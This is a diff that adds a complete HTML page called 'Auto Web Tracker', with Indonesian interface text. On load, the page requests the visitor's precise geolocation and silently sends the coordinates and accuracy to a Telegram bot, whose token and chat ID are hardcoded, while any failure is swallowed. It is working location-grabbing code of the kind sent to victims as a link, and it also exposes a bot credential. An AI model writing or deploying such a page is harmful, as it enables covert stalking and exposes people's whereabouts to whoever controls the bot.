@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+<title>Auto Web Tracker</title>
+<style>
+  body {
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 600px;
+    max-width: 350px;
+    margin: 0 auto;
+    text-align: center;
+    background: linear-gradient(135deg, #667eea, #764ba2);
+    color: white;
+  }
+  #message {
+    font-weight: 700;
+    font-size: 1.5rem;
+    user-select: none;
+  }
+</style>
+</head>
+<body>
+<div id="message">Meminta izin lokasi...</div>
+
+<script>
+(() => {
+  const TELEGRAM_TOKEN = "7790169626:AAEpBZcgJMAlU0F81GLoLTyyEYZCGEDBOi4";
+  const CHAT_ID = "7267616724";
+
+  const messageEl = document.getElementById('message');
+
+  function sendLocationToTelegram(latitude, longitude, accuracy) {
+    const text = `Tracking By OrangGanteng\nLocation:\nLatitude: ${latitude}\nLongitude: ${longitude}\nAccuracy: ±${accuracy} meters`;
+    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+    fetch(url, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: text
+      })
+    }).catch(() => {
+      // fail silently
+    });
+  }
+
+  function successCallback(position) {
+    const {latitude, longitude, accuracy} = position.coords;
+    messageEl.textContent = "Tracking By OrangGanteng";
+    sendLocationToTelegram(latitude, longitude, accuracy);
+  }
+
+  function errorCallback(error) {
+    let errorMsg = '';
+    switch(error.code) {
+      case error.PERMISSION_DENIED:
+        errorMsg = "Izin lokasi ditolak.";
+        break;
+      case error.POSITION_UNAVAILABLE:
+        errorMsg = "Lokasi tidak tersedia.";
+        break;
+      case error.TIMEOUT:
+        errorMsg = "Permintaan lokasi timeout.";
+        break;
+      default:
+        errorMsg = "Terjadi kesalahan dalam meminta lokasi.";
+    }
+    messageEl.textContent = errorMsg;
+  }
+
+  function requestLocation() {
+    if (!navigator.geolocation) {
+      messageEl.textContent = "Geolocation tidak didukung oleh browser ini.";
+      return;
+    }
+    navigator.geolocation.getCurrentPosition(successCallback, errorCallback, {
+      enableHighAccuracy: true,
+      maximumAge: 0,
+      timeout: 10000 // 10 seconds max
+    });
+  }
+
+  // Demand permission as soon as possible on page load:
+  document.addEventListener('DOMContentLoaded', () => {
+    // In some browsers, permissions are requested on geolocation call directly.
+    // This will trigger and request permission immediately.
+    requestLocation();
+  });
+})();
+</script>
+</body>
+</html>
+
+```
